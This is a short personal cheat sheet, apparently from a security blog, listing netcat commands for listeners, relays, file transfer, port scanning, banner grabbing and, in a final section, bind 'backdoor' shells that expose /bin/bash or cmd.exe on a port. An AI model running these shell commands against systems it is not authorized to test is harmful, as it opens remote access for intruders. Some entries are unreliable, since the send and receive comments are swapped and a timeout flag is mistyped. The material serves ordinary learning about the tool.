---
title: Meow's Testing Tools - netcat
date: 2019-09-17 11:11:11 -0400
categories: [10CyberAttack, CyberAttackTools]
tags: [CyberAttack, CyberAttackTools]
toc: true
image:
---

# netcat

[toc]

---

# Netcat Fundamentals

```bash
nc [options] [host] [port]
# by default this will execute a port scan

nc -l [host] [port]
# initiates a listener on the given port

Netcat Command Flags
nc -4
# use IPv4 only

nc -6
# use IPv6

nc -u
# use UDP instead of TCP

nc -k -l
# continue listening after disconnection

nc -n
# skip DNS lookups

nc -v
# provide verbose output
```

### Netcat Relays on Windows

```bash
nc [host] [port] > relay.bat
# open a relay connection

nc -l -p [port] -e relay.bat
# connect to relay
```

### Netcat Relays on Linux
```
nc -l -p [port] 0 (less than) backpipe (pipe) nc [client IP] [port] (pipe) tee backpipe
```

### Netcat File Transfer

```bash
nc [host] [port] (greater than) file_name.out
# send a file

nc [host] [port] (less than) file_name.in
# receive a file
```


### Netcat Port Scanner

```bash
nc -zv site.com 80
# scan a single port

nc -zv hostname.com 80 84
# scan a set of individual ports

nc -zv site.com 80-84
# scan a range of ports
```


### Netcat Banners

```bash
echo “” | nc -zv -wl [host] [port range]
# obtain the TCP banners for a range of ports
```

### Netcat Backdoor Shells

```bash
nc -l -p [port] -e /bin/bash
# run a shell on Linux

nc -l -p [port] -e cmd.exe
# run a shell on Netcat for Windows
```








ref:
- [nmap](https://nmap.org/bennieston-tutorial/)
